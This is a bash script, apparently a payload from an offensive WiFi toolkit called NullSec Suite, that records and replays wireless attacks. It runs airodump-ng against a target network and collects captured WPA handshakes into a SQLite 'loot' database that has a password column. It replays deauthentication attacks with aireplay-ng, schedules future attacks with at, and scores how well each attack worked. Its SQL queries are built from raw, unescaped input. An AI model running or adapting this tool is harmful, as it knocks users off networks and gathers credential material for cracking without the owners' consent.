#!/bin/bash
#
# WiFiTimeMachine - Historical WiFi Attack Replay System
# Records and replays WiFi attack scenarios across time
# NullSec Suite | For authorized testing only
#
# UNIQUE FEATURES:
# - Full attack session recording with metadata
# - Time-delayed attack replay
# - Attack pattern analysis and optimization
# - Historical handshake correlation
# - Attack effectiveness scoring

PAYLOAD_NAME="WiFiTimeMachine"
VERSION="1.0.0"
LOOT_DIR="/root/loot/timemachine"
DB_FILE="$LOOT_DIR/timemachine.db"

show_banner() {
    echo -e "\033[1;33m"
    cat << "EOF"
 __        _____ _____ _   _____ _                __  __            _     _            
 \ \      / (___|  ___(_) |_   _(_)_ __ ___   ___|  \/  | __ _  ___| |__ (_)_ __   ___ 
  \ \ /\ / / | | |_   | |   | | | | '_ ` _ \ / _ \ |\/| |/ _` |/ __| '_ \| | '_ \ / _ \
   \ V  V /  | |  _|  | |   | | | | | | | | |  __/ |  | | (_| | (__| | | | | | | |  __/
    \_/\_/   |_| |    |_|   |_| |_|_| |_| |_|\___|_|  |_|\__,_|\___|_| |_|_|_| |_|\___|
                                                                                       
    [ Historical WiFi Attack Replay System ]
    [ NullSec Suite v${VERSION} ]
EOF
    echo -e "\033[0m"
}

init_timemachine() {
    mkdir -p "$LOOT_DIR"/{recordings,replays,analysis,handshakes}
    
    # Initialize SQLite database
    sqlite3 "$DB_FILE" << 'SQL'
CREATE TABLE IF NOT EXISTS sessions (
    id INTEGER PRIMARY KEY,
    name TEXT,
    start_time DATETIME,
    end_time DATETIME,
    attack_type TEXT,
    target_bssid TEXT,
    target_ssid TEXT,
    channel INTEGER,
    success INTEGER DEFAULT 0,
    handshakes_captured INTEGER DEFAULT 0,
    clients_deauthed INTEGER DEFAULT 0,
    notes TEXT
);

CREATE TABLE IF NOT EXISTS events (
    id INTEGER PRIMARY KEY,
    session_id INTEGER,
    timestamp DATETIME,
    event_type TEXT,
    details TEXT,
    FOREIGN KEY(session_id) REFERENCES sessions(id)
);

CREATE TABLE IF NOT EXISTS handshakes (
    id INTEGER PRIMARY KEY,
    session_id INTEGER,
    bssid TEXT,
    client_mac TEXT,
    capture_time DATETIME,
    file_path TEXT,
    cracked INTEGER DEFAULT 0,
    password TEXT,
    FOREIGN KEY(session_id) REFERENCES sessions(id)
);

CREATE TABLE IF NOT EXISTS effectiveness (
    id INTEGER PRIMARY KEY,
    attack_type TEXT,
    target_vendor TEXT,
    success_rate REAL,
    avg_time_to_handshake REAL,
    sample_count INTEGER,
    best_technique TEXT
);
SQL
    
    echo "[*] TimeMachine initialized"
}

# Start recording an attack session
start_recording() {
    local session_name=$1
    local attack_type=$2
    local target_bssid=$3
    local target_ssid=$4
    local channel=$5
    
    echo "[*] Starting recording: $session_name"
    
    # Create session in database
    SESSION_ID=$(sqlite3 "$DB_FILE" "INSERT INTO sessions (name, start_time, attack_type, target_bssid, target_ssid, channel) VALUES ('$session_name', datetime('now'), '$attack_type', '$target_bssid', '$target_ssid', $channel); SELECT last_insert_rowid();")
    
    echo "$SESSION_ID" > "$LOOT_DIR/current_session.id"
    
    # Start packet capture
    local capture_file="$LOOT_DIR/recordings/session_${SESSION_ID}_$(date +%s).pcap"
    airodump-ng --bssid "$target_bssid" -c "$channel" -w "${capture_file%.pcap}" wlan1mon &
    echo $! > "$LOOT_DIR/airodump.pid"
    
    # Start event logger
    log_event "session_start" "Recording started for $target_ssid"
    
    # Monitor for handshakes in background
    monitor_handshakes &
    
    echo "[*] Recording session $SESSION_ID"
}

# Log events during recording
log_event() {
    local event_type=$1
    local details=$2
    local session_id=$(cat "$LOOT_DIR/current_session.id" 2>/dev/null)
    
    if [ -n "$session_id" ]; then
        sqlite3 "$DB_FILE" "INSERT INTO events (session_id, timestamp, event_type, details) VALUES ($session_id, datetime('now'), '$event_type', '$details');"
    fi
}

# Monitor for handshake captures
monitor_handshakes() {
    local session_id=$(cat "$LOOT_DIR/current_session.id" 2>/dev/null)
    
    while [ -f "$LOOT_DIR/current_session.id" ]; do
        # Check for new handshakes
        for cap in "$LOOT_DIR/recordings/"*.cap; do
            if [ -f "$cap" ]; then
                # Check if contains handshake
                if aircrack-ng "$cap" 2>/dev/null | grep -q "1 handshake"; then
                    local bssid=$(aircrack-ng "$cap" 2>/dev/null | grep -oP '([0-9A-F]{2}:){5}[0-9A-F]{2}')
                    
                    # Record handshake if not already recorded
                    local exists=$(sqlite3 "$DB_FILE" "SELECT COUNT(*) FROM handshakes WHERE session_id=$session_id AND file_path='$cap';")
                    if [ "$exists" -eq 0 ]; then
                        sqlite3 "$DB_FILE" "INSERT INTO handshakes (session_id, bssid, capture_time, file_path) VALUES ($session_id, '$bssid', datetime('now'), '$cap');"
                        sqlite3 "$DB_FILE" "UPDATE sessions SET handshakes_captured = handshakes_captured + 1 WHERE id = $session_id;"
                        log_event "handshake_captured" "Handshake captured for $bssid"
                        echo "[!] Handshake captured!"
                    fi
                fi
            fi
        done
        sleep 5
    done
}

# Stop recording
stop_recording() {
    local session_id=$(cat "$LOOT_DIR/current_session.id" 2>/dev/null)
    
    if [ -n "$session_id" ]; then
        # Update session end time
        sqlite3 "$DB_FILE" "UPDATE sessions SET end_time = datetime('now') WHERE id = $session_id;"
        
        log_event "session_end" "Recording stopped"
        
        # Stop airodump
        kill $(cat "$LOOT_DIR/airodump.pid" 2>/dev/null) 2>/dev/null
        
        rm -f "$LOOT_DIR/current_session.id"
        
        echo "[*] Recording stopped for session $session_id"
        
        # Analyze session
        analyze_session "$session_id"
    fi
}

# Replay a recorded attack session
replay_session() {
    local session_id=$1
    local speed_multiplier=${2:-1}
    
    echo "[*] Replaying session $session_id at ${speed_multiplier}x speed"
    
    # Get session info
    local session_info=$(sqlite3 -separator '|' "$DB_FILE" "SELECT attack_type, target_bssid, target_ssid, channel FROM sessions WHERE id=$session_id;")
    local attack_type=$(echo "$session_info" | cut -d'|' -f1)
    local target_bssid=$(echo "$session_info" | cut -d'|' -f2)
    local target_ssid=$(echo "$session_info" | cut -d'|' -f3)
    local channel=$(echo "$session_info" | cut -d'|' -f4)
    
    echo "[*] Attack type: $attack_type"
    echo "[*] Target: $target_ssid ($target_bssid)"
    echo "[*] Channel: $channel"
    
    # Get events in order
    local events=$(sqlite3 -separator '|' "$DB_FILE" "SELECT event_type, details, timestamp FROM events WHERE session_id=$session_id ORDER BY timestamp;")
    
    local prev_time=""
    
    echo "$events" | while IFS='|' read event_type details timestamp; do
        if [ -n "$prev_time" ]; then
            # Calculate delay
            local delay=$(sqlite3 "$DB_FILE" "SELECT (julianday('$timestamp') - julianday('$prev_time')) * 86400;")
            local adjusted_delay=$(echo "$delay / $speed_multiplier" | bc -l)
            
            echo "[*] Waiting ${adjusted_delay}s..."
            sleep "$adjusted_delay"
        fi
        
        echo "[REPLAY] $timestamp: $event_type - $details"
        
        # Execute event
        case $event_type in
            "deauth")
                aireplay-ng -0 1 -a "$target_bssid" wlan1mon 2>/dev/null
                ;;
            "beacon_flood")
                # Replay beacon flood
                ;;
            *)
                # Log-only event
                ;;
        esac
        
        prev_time="$timestamp"
    done
    
    echo "[*] Replay complete"
}

# Analyze session effectiveness
analyze_session() {
    local session_id=$1
    
    echo "[*] Analyzing session $session_id..."
    
    # Get session stats
    local stats=$(sqlite3 -separator '|' "$DB_FILE" "
        SELECT 
            s.attack_type,
            s.target_ssid,
            s.handshakes_captured,
            s.clients_deauthed,
            (julianday(s.end_time) - julianday(s.start_time)) * 86400 as duration,
            COUNT(e.id) as event_count
        FROM sessions s
        LEFT JOIN events e ON s.id = e.session_id
        WHERE s.id = $session_id
        GROUP BY s.id;
    ")
    
    local attack_type=$(echo "$stats" | cut -d'|' -f1)
    local target_ssid=$(echo "$stats" | cut -d'|' -f2)
    local handshakes=$(echo "$stats" | cut -d'|' -f3)
    local clients=$(echo "$stats" | cut -d'|' -f4)
    local duration=$(echo "$stats" | cut -d'|' -f5)
    local events=$(echo "$stats" | cut -d'|' -f6)
    
    # Calculate effectiveness score
    local score=0
    [ "$handshakes" -gt 0 ] && score=$((score + 50))
    [ "$clients" -gt 5 ] && score=$((score + 20))
    [ "${duration%.*}" -lt 300 ] && score=$((score + 30))  # Under 5 min is bonus
    
    # Determine success
    local success=0
    [ "$handshakes" -gt 0 ] && success=1
    
    sqlite3 "$DB_FILE" "UPDATE sessions SET success = $success WHERE id = $session_id;"
    
    # Output analysis
    cat << ANALYSIS

╔════════════════════════════════════════════════════════════╗
║                    SESSION ANALYSIS                        ║
╠════════════════════════════════════════════════════════════╣
║ Session ID:        $session_id
║ Attack Type:       $attack_type
║ Target:            $target_ssid
║ Duration:          ${duration%.*} seconds
║ Events Logged:     $events
║ Handshakes:        $handshakes
║ Clients Affected:  $clients
║ Success:           $([ $success -eq 1 ] && echo "YES ✓" || echo "NO ✗")
║ Effectiveness:     $score/100
╚════════════════════════════════════════════════════════════╝

ANALYSIS
    
    # Update effectiveness stats
    update_effectiveness "$attack_type" "$success" "$duration"
}

# Update historical effectiveness data
update_effectiveness() {
    local attack_type=$1
    local success=$2
    local duration=$3
    
    # Get existing stats
    local existing=$(sqlite3 "$DB_FILE" "SELECT id, success_rate, sample_count FROM effectiveness WHERE attack_type='$attack_type';")
    
    if [ -n "$existing" ]; then
        local id=$(echo "$existing" | cut -d'|' -f1)
        local old_rate=$(echo "$existing" | cut -d'|' -f2)
        local count=$(echo "$existing" | cut -d'|' -f3)
        
        # Calculate new average
        local new_rate=$(echo "($old_rate * $count + $success) / ($count + 1)" | bc -l)
        local new_count=$((count + 1))
        
        sqlite3 "$DB_FILE" "UPDATE effectiveness SET success_rate=$new_rate, sample_count=$new_count WHERE id=$id;"
    else
        sqlite3 "$DB_FILE" "INSERT INTO effectiveness (attack_type, success_rate, sample_count) VALUES ('$attack_type', $success, 1);"
    fi
}

# Schedule attack for future time
schedule_attack() {
    local session_id=$1
    local schedule_time=$2
    
    echo "[*] Scheduling replay of session $session_id for $schedule_time"
    
    # Create at job
    echo "cd $(dirname $0) && ./WiFiTimeMachine_payload.sh replay $session_id" | at "$schedule_time"
    
    echo "[*] Attack scheduled"
}

# Find best attack pattern for target type
recommend_attack() {
    local target_vendor=$1
    
    echo "[*] Analyzing historical data for $target_vendor..."
    
    # Query effectiveness data
    sqlite3 -header -column "$DB_FILE" "
        SELECT 
            attack_type,
            printf('%.1f%%', success_rate * 100) as success_rate,
            printf('%.1f', avg_time_to_handshake) as avg_time,
            sample_count as samples
        FROM effectiveness
        ORDER BY success_rate DESC
        LIMIT 5;
    "
}

# View session history
view_history() {
    echo ""
    echo "=== Attack Session History ==="
    echo ""
    
    sqlite3 -header -column "$DB_FILE" "
        SELECT 
            id,
            name,
            attack_type,
            target_ssid,
            datetime(start_time) as started,
            handshakes_captured as hs,
            CASE success WHEN 1 THEN '✓' ELSE '✗' END as ok
        FROM sessions
        ORDER BY start_time DESC
        LIMIT 20;
    "
}

# Export session for sharing
export_session() {
    local session_id=$1
    local export_file="$LOOT_DIR/exports/session_${session_id}_$(date +%s).tar.gz"
    
    mkdir -p "$LOOT_DIR/exports"
    
    # Export database records
    sqlite3 "$DB_FILE" ".dump sessions" | grep "INSERT.*$session_id" > "/tmp/session_$session_id.sql"
    sqlite3 "$DB_FILE" ".dump events" | grep "session_id.*$session_id" >> "/tmp/session_$session_id.sql"
    sqlite3 "$DB_FILE" ".dump handshakes" | grep "session_id.*$session_id" >> "/tmp/session_$session_id.sql"
    
    # Bundle with captures
    tar -czf "$export_file" \
        -C "$LOOT_DIR/recordings" . \
        -C /tmp "session_$session_id.sql" \
        2>/dev/null
    
    echo "[*] Exported to: $export_file"
}

# Main menu
main_menu() {
    while true; do
        show_banner
        echo ""
        echo "1) Initialize TimeMachine"
        echo "2) Start Recording Session"
        echo "3) Stop Recording"
        echo "4) Replay Session"
        echo "5) View Session History"
        echo "6) Analyze Session"
        echo "7) Schedule Future Attack"
        echo "8) Get Attack Recommendations"
        echo "9) Export Session"
        echo "0) Exit"
        echo ""
        read -p "[TimeMachine]> " choice
        
        case $choice in
            1) init_timemachine ;;
            2)
                read -p "Session name: " name
                read -p "Attack type (deauth/eviltwin/handshake): " type
                read -p "Target BSSID: " bssid
                read -p "Target SSID: " ssid
                read -p "Channel: " channel
                start_recording "$name" "$type" "$bssid" "$ssid" "$channel"
                ;;
            3) stop_recording ;;
            4)
                view_history
                read -p "Session ID to replay: " sid
                read -p "Speed multiplier (default 1): " speed
                replay_session "$sid" "${speed:-1}"
                ;;
            5) view_history; read -p "Press Enter..." ;;
            6)
                view_history
                read -p "Session ID: " sid
                analyze_session "$sid"
                read -p "Press Enter..."
                ;;
            7)
                view_history
                read -p "Session ID: " sid
                read -p "Schedule time (e.g., 'now + 1 hour'): " when
                schedule_attack "$sid" "$when"
                ;;
            8)
                read -p "Target vendor (or 'all'): " vendor
                recommend_attack "$vendor"
                read -p "Press Enter..."
                ;;
            9)
                view_history
                read -p "Session ID to export: " sid
                export_session "$sid"
                ;;
            0) 
                stop_recording 2>/dev/null
                exit 0
                ;;
        esac
    done
}

# CLI mode
if [ "$1" = "replay" ] && [ -n "$2" ]; then
    init_timemachine
    replay_session "$2"
    exit 0
fi

main_menu
